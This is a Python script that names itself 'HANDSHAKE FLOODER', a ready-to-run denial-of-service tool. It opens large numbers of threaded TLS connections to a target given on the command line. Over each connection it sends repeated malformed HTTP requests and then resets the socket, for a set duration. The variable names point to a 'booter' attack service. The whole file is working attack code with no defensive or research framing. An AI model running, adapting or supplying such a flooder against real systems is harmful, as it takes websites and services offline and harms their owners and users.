import socket,ssl,threading,struct
from MODEL.data import get_target,generate_url_path

def RENEGOTIATE_SEND(ssl_socket,byt2,byt):
   try:
    for _ in range(250):
        ssl_socket.write(byt2); ssl_socket.sendall(byt2); ssl_socket.send(byt2)
        ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
        ssl_socket.write(byt); ssl_socket.sendall(byt); ssl_socket.send(byt)
        ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
    ssl_socket.close()
   except:pass

def RENEGOTIATE_KEY(target,methods,duration_sec_attack_dude,byt):
    for _ in range(int(duration_sec_attack_dude)):
        try:
            for _ in range(500):
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect((str(target['host']),int(target['port'])))
             s.connect_ex((str(target['host']),int(target['port'])))
             ssl_socket = ssl.SSLContext().wrap_socket(s,server_hostname=target['host'])
             url_path = generate_url_path(1)
             byt2 = f"{methods} /{url_path} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
             ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
             threading.Thread(target=RENEGOTIATE_SEND,args=(ssl_socket,byt2,byt)).start()
        except Exception as e:
           print(e)
           pass

import sys
url = ''
time_booter = 0
thread_lower = 0
METHODS = ''
if len(sys.argv) == 5:
   url = sys.argv[1]
   thread_lower = int(sys.argv[2])
   time_booter = int(sys.argv[3])
   METHODS = sys.argv[4]
else:
 print(f'WELCOME TO HANDSHAKE FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METHODS>')
target = get_target(url)
byt = f"{METHODS} {target['uri']} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
for _ in range(int(thread_lower)):
   for _ in range(10):threading.Thread(target=RENEGOTIATE_KEY,args=(target,METHODS,time_booter,byt)).start()